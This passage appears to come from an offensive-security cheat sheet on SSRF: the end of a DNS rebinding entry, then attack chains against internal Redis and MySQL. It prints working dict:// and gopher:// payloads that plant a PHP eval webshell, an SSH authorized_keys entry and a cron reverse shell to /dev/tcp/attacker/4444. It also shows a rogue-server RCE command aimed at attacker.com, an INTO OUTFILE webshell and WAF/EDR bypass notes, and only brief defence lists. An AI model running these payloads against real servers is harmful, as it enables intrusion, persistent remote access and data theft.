**Vulnerability Principle:** DNS rebinding uses a domain with an extremely low DNS TTL (0-1 second): the first resolution returns a public IP to pass the server-side URL validation, and the second resolution (during the actual request) returns 127.0.0.1 or an internal IP. Online DNS rebinding services (such as rbndr.us/lock.cmpxchg8b.com) or a self-hosted DNS server can be used.

**Exploitation Method:** Complete exploitation flow:
1. Set up or use a DNS rebinding service
2. Configure the domain resolution policy
3. Initiate the request using that domain
4. Bypass validation and access the internal network

**Defensive Measures:** Defenses:
1. Cache DNS resolution results
2. Validate using the IP address rather than the domain
3. Disable DNS resolution
4. Network-layer isolation

---

### SSRF Attack on Redis  `ssrf-redis`
_Use SSRF to attack an internal Redis service_
Subcategory: **Redis Attack** · tags: `ssrf` `redis` `rce` `webshell`

**Prerequisites:**
- An SSRF vulnerability exists
- An unauthenticated Redis exists in the internal network

**Attack Chain:**

**1. Probe Redis**
> Probe the Redis service
```
dict://127.0.0.1:6379/info
Or use Gopher:
gopher://127.0.0.1:6379/_INFO
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/info
Or use Gopher:
gopher://127.0.0.1:6379/_INFO` — attack payload _value_

**2. Write a WebShell**
> Write a WebShell to the web directory
```
# Use the Dict protocol
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```
**Syntax breakdown:**
- `set shell` — set a key-value pair _value_
- `config set dir` — set the save directory _value_
- `config set dbfilename` — set the save filename _value_
- `save` — save the database to a file _value_

**3. Write an SSH public key**
> Write an SSH public key
```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa` — command/payload start _command_
- ` AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save` — parameters and payload content _value_

**4. Write a Cron job**
> Write a Cron reverse shell
_platform: linux_
```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/444` — attack payload _value_

**5. Master-slave replication RCE**
> Master-slave replication RCE
```
# Use redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
Use Redis master-slave replication to load a malicious module
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Use redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
Use Redis master-slave replication to load a malicious module` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**Gopher protocol construction**
> Use the Gopher protocol
```
Use the Gopher protocol to construct a complete Redis command sequence
Can bypass Dict protocol restrictions
```
**Syntax breakdown:**
- `Use the Gopher protocol to construct a complete Redis command sequence
Can bypass Dict protocol restrictions` — attack payload _value_

**Overview:** SSRF attacks on Redis is the most classic internal service exploitation scenario. By sending commands to Redis via the gopher:// protocol, one can write a WebShell, SSH public key, crontab scheduled task, and so on, upgrading directly from SSRF to server RCE.

**Vulnerability Principle:** Redis is unauthenticated by default and listens on 0.0.0.0:6379. SSRF sends Redis commands via gopher://: 1) SET/CONFIG SET dir+dbfilename to write a WebShell to the web directory 2) write an SSH public key to /root/.ssh/authorized_keys 3) write a crontab reverse shell 4) master-slave replication to load a malicious module (RCE).

**Exploitation Method:** Complete exploitation flow:
1. Probe Redis via SSRF
2. Write a WebShell
3. Or write an SSH public key
4. Or write a Cron job
5. Obtain server privileges

**Defensive Measures:** Defenses:
1. Set password authentication for Redis
2. Bind to an internal IP
3. Disable dangerous commands
4. Network isolation

---

### SSRF Attack on MySQL  `ssrf-mysql`
_Use SSRF to attack an internal MySQL service_
Subcategory: **MySQL Attack** · tags: `ssrf` `mysql` `gopher` `database`

**Prerequisites:**
- An SSRF vulnerability exists
- A MySQL service exists in the internal network
- The MySQL username is known

**Attack Chain:**

**1. MySQL protocol basics**
> MySQL protocol basics
```
MySQL communication protocol:
- Handshake packet
- Authentication packet
- Command packet
Needs to construct data conforming to the protocol
```
**Syntax breakdown:**
- `MySQL communication protocol` — MySQL uses a custom binary protocol for communication, based on TCP _command_
- `Handshake packet` — the initial packet sent by the server, containing the protocol version, server version, and random challenge _parameter_
- `Authentication packet` — the authentication information sent by the client, containing the username and encrypted password _parameter_
- `Command packet` — the SQL command packet sent after authentication, of type COM_QUERY (0x03) _value_

**2. Use Gopher to attack MySQL**
> Gopher protocol attack on MySQL
```
# Construct MySQL protocol packets
# Needs to be generated with a tool
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# Use sqlmap
gopher://127.0.0.1:3306/_[payload generated by sqlmap]
```
**Syntax breakdown:**
- `gopher://` — Gopher protocol prefix, allows sending raw TCP data _command_
- `127.0.0.1:3306` — the target MySQL service address and port (default 3306) _value_
- `/_` — Gopher data separator, after _ is the actual data sent _operator_
- `[MySQL Protocol Data]` — the URL-encoded MySQL protocol binary packet _variable_

**3. Use a tool to generate the payload**
> Use a tool to generate the payload
```
# Use the Gopherus tool
python gopherus.py --exploit mysql
Enter the username and SQL command
Generate the Gopher URL

# Or use the mysql_gopher_attack tool
```
**Syntax breakdown:**
- `python gopherus.py` — run the Gopherus automated Gopher payload generation tool _command_
- `--exploit mysql` — specify the attack target as the MySQL service _parameter_
- `Enter the username and SQL command` — interactively enter the MySQL username (often root) and the SQL to execute _value_

**4. Execute SQL commands**
> Execute SQL commands
```
SELECT * FROM users;
SELECT user(), version();
Write a WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```
**Syntax breakdown:**
- `SELECT user(), version()` — query the current database user and MySQL version information _command_
- `INTO OUTFILE` — MySQL file-write statement, requires the FILE privilege and secure_file_priv to allow it _parameter_
- `/var/www/html/shell.php` — the WebShell write path, must be in a web-accessible directory _value_

**WAF/EDR Bypass Variants:**

**Passwordless MySQL**
> Exploit an empty-password configuration
```
If MySQL allows an empty-password connection
It is easier to construct the attack payload
```
**Syntax breakdown:**
- `Empty-password connection` — when MySQL allows an empty password, the password field in the authentication packet is empty _command_
- `Simplified protocol construction` — no need to compute the password hash, the attack payload is simpler and more reliable _parameter_

**Overview:** SSRF attacks on MySQL use the gopher:// protocol to construct MySQL communication packets. When the target MySQL allows passwordless local connections, arbitrary SQL statements can be executed to read sensitive data or write a WebShell via INTO OUTFILE.

**Vulnerability Principle:** When MySQL authentication allows a passwordless local connection (common in development environments), SSRF sends MySQL protocol packets via gopher://: 1) the authentication handshake packet 2) query packets (SELECT/INSERT/INTO OUTFILE). Tools such as Gopherus can automatically generate the URL-encoded MySQL protocol payload.

**Exploitation Method:** Complete exploitation flow:
1. Confirm the MySQL service
2. Obtain the username
3. Construct the protocol packets
4. Execute SQL commands
5. Write a WebShell

**Defensive Measures:** Defenses:
1. Set a strong password for MySQL
2. Prohibit empty-password login
3. Restrict network access
4. Disable the file write feature

---
